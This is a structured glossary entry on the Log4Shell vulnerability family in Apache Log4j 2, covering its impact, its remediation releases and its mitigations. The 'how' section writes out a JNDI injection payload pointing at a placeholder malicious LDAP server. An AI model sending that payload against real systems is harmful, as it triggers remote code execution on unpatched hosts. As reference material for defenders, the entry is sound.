definition:
  what: "Log4Shell is the widely recognized name for the critical vulnerability family centered on CVE-2021-44228 in Apache Log4j 2, a pervasive Java logging framework. The name Log4Shell encapsulates the original JNDI injection RCE vulnerability and its related follow-on CVEs (CVE-2021-45046, CVE-2021-45105, CVE-2021-44832) that were discovered during the remediation process. The Log4Shell crisis represents one of the most significant cybersecurity events in history due to the extreme ubiquity of the affected library across global IT infrastructure. CVSS v3: 10.0 (Critical). Disclosed December 2021."
  why: "Log4Shell became a defining cybersecurity event because Apache Log4j is embedded as a transitive dependency in an estimated hundreds of thousands of Java applications worldwide, spanning enterprise systems, cloud services, embedded devices, and open-source projects. The vulnerability was trivially exploitable, required no authentication, and provided immediate remote code execution. The software supply chain impact was unprecedented, as organizations struggled to identify all instances of Log4j across their environments. Nation-state threat actors, ransomware operators, and cryptomining groups began mass exploitation within hours of disclosure. The incident catalyzed global conversations about software supply chain security and open-source maintainer support."
  how: "The Log4Shell attack chain exploits Log4j's JNDI message lookup substitution feature. Attackers inject strings containing ${jndi:ldap://malicious-server/exploit} into any input that gets processed by Log4j logging calls. The library resolves the JNDI expression by connecting to the specified remote server, which delivers a malicious Java class for execution. Attack vectors include HTTP headers, URL parameters, form inputs, and any protocol data that reaches a logging statement. The remediation effort required multiple Log4j releases: 2.15.0 (initial incomplete fix), 2.16.0 (disabled lookups by default), and 2.17.0 (final comprehensive fix). Organizations also employed virtual patching via WAF rules, network-level blocking of outbound JNDI connections, and removal of the JndiLookup class from Log4j JARs."
  core_concepts:
    - key: "JNDI Injection Chain"
      value: "The core attack mechanism exploits Log4j's message lookup substitution to trigger JNDI resolution, connecting to attacker-controlled naming services that deliver malicious Java objects for deserialization and code execution"
    - key: "Software Supply Chain Crisis"
      value: "Log4Shell exposed the fragility of software supply chains, as a vulnerability in a single ubiquitous logging library created a global remediation crisis affecting virtually every Java-based system"
    - key: "Multi-CVE Remediation"
      value: "The initial fix for CVE-2021-44228 was incomplete, spawning follow-on CVEs (45046, 45105, 44832) that required successive patches, highlighting the difficulty of comprehensively fixing deeply embedded vulnerabilities"
